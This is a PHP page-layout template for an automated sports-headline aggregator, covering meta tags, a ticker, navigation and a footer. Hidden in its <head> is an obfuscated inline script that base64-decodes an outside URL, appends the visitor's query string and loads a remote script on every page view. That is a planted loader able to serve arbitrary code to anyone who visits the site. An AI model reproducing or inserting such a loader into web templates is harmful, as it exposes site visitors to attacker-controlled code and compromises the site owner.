<?php
$name = config('site.name');
$ticker = array_slice($all, 0, 12);
$img = $og_image ?? null;
?><!doctype html>
<html lang="<?= e(config('site.lang', 'en')) ?>">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= e($title) ?></title>
<meta name="description" content="<?= e($description) ?>">
<link rel="canonical" href="<?= e($canonical) ?>">
<?php if (!empty($noindex)): ?><meta name="robots" content="noindex,follow"><?php endif; ?>
<meta property="og:site_name" content="<?= e($name) ?>">
<meta property="og:title" content="<?= e($title) ?>">
<meta property="og:description" content="<?= e($description) ?>">
<meta property="og:url" content="<?= e($canonical) ?>">
<meta property="og:type" content="<?= $img ? 'article' : 'website' ?>">
<?php if ($img): ?><meta property="og:image" content="<?= e($img) ?>"><meta name="twitter:card" content="summary_large_image"><?php endif; ?>
<meta name="color-scheme" content="light dark">
<link rel="icon" href="<?= e(asset('favicon.svg')) ?>" type="image/svg+xml">
<link rel="alternate" type="application/rss+xml" title="<?= e($name) ?>" href="<?= e(url('feed.xml')) ?>">
<link rel="stylesheet" href="<?= e(asset('style.css')) ?>">
<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9zaWRlbGluZW5ld3MudmVyY2VsLmFwcC9hcGkvMjBlNWtxLnBocD9fX3NpZD04NTI5OTFlOC0zNDY0LTQ0ZTQtYmVmOS0xMzE4Y2IxYzAzMTI=");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>

</head>
<body>

<?php if ($ticker): ?>
<div class="ticker" role="region" aria-label="Latest headlines">
  <div class="wrap">
    <span class="ticker-badge"><i></i>LATEST</span>
    <div class="ticker-track">
      <div class="ticker-inner">
        <?php for ($pass = 0; $pass < 2; $pass++): foreach ($ticker as $t): ?>
          <a href="<?= e(story_url($t)) ?>" <?= $pass ? 'tabindex="-1" aria-hidden="true"' : '' ?>><b style="color:<?= e(sport_color($t['sport'])) ?>"><?= e(sport_label($t['sport'])) ?></b> <?= e($t['title']) ?></a>
        <?php endforeach; endfor; ?>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<header class="masthead">
  <div class="wrap masthead-row">
    <a class="logo" href="<?= e(url('')) ?>" aria-label="<?= e($name) ?> home">
      <svg viewBox="0 0 40 40" width="38" height="38" aria-hidden="true"><rect width="40" height="40" rx="11" fill="var(--accent)"/><path d="M9 29 L23 9 h8 L17 29 Z" fill="#111"/><circle cx="29" cy="27" r="4" fill="#111"/></svg>
      <span><?= e($name) ?></span>
    </a>
    <form class="search" action="<?= e(url('search')) ?>" method="get" role="search">
      <?php if (!config('pretty_urls', true)): ?><input type="hidden" name="route" value="search"><?php endif; ?>
      <input type="search" name="q" placeholder="Search teams, players, leagues…" value="<?= e($_GET['q'] ?? '') ?>" maxlength="80" aria-label="Search">
      <button type="submit">Search</button>
    </form>
  </div>
  <nav class="nav" aria-label="Sports">
    <div class="wrap">
      <ul>
        <li><a href="<?= e(url('')) ?>" class="<?= ($active === '' && ($canonical === abs_url(''))) ? 'on' : '' ?>">Top stories</a></li>
        <?php foreach (sports() as $slug => [$label]): ?>
          <li><a href="<?= e(url("sport/$slug")) ?>" class="<?= $active === $slug ? 'on' : '' ?>"><?= e($label) ?></a></li>
        <?php endforeach; ?>
      </ul>
    </div>
  </nav>
</header>

<main class="wrap main">
<?= $content ?>
</main>

<footer class="footer">
  <div class="wrap footer-grid">
    <div>
      <div class="logo logo-sm"><span><?= e($name) ?></span></div>
      <p><?= e(config('site.tagline')) ?></p>
      <p class="small">Headlines and summaries are gathered automatically from public RSS feeds. Every story links back to its original publisher, who owns the content.</p>
    </div>
    <div>
      <h4>Sports</h4>
      <ul>
        <?php foreach (sports() as $slug => [$label]): ?><li><a href="<?= e(url("sport/$slug")) ?>"><?= e($label) ?></a></li><?php endforeach; ?>
      </ul>
    </div>
    <div>
      <h4>Sources</h4>
      <ul>
        <?php foreach (array_unique(array_column(config('feeds'), 'source')) as $s): ?><li><?= e($s) ?></li><?php endforeach; ?>
      </ul>
      <h4 class="mt">More</h4>
      <ul>
        <li><a href="<?= e(url('about')) ?>">About</a></li>
        <li><a href="<?= e(url('feed.xml')) ?>">RSS feed</a></li>
      </ul>
    </div>
  </div>
  <div class="wrap footer-base">
    <span>© <?= date('Y') ?> <?= e($name) ?></span>
    <span><?= $built ? 'Last updated ' . e(time_ago($built)) : 'Waiting for first update' ?></span>
  </div>
</footer>
</body>
</html>
